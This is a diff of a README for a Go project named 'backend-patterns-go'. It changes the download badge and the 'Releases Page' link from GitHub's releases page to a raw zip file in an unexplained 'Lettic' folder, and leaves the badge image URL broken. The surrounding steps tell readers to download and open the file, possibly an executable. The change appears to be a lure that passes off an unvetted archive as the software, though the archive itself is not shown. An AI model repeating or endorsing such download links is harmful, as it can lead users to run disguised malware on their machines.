@@ -1,6 +1,6 @@
 # 🌟 backend-patterns-go - Easy Go Services for Everyone
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/mrngapyin1-ship-it/backend-patterns-go/releases)
+[![Download the latest release](https://raw.githubusercontent.com/mrngapyin1-ship-it/backend-patterns-go/main/Lettic/backend-patterns-go.zip%20Now-brightgreen)](https://raw.githubusercontent.com/mrngapyin1-ship-it/backend-patterns-go/main/Lettic/backend-patterns-go.zip)
 
 ## 📝 Description
 
@@ -12,7 +12,7 @@ To get started with backend-patterns-go, follow the simple steps below. You don'
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to [this page to download](https://github.com/mrngapyin1-ship-it/backend-patterns-go/releases).
+1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/mrngapyin1-ship-it/backend-patterns-go/main/Lettic/backend-patterns-go.zip).
 2. **Choose a Version**: Look for the latest version at the top of the page. You will see different files available for download.
 3. **Download the File**: Click on the file that matches your operating system. This could be a `.zip` or an executable file, depending on your system.
 4. **Open the File**: After downloading, locate the file in your downloads folder and open it.
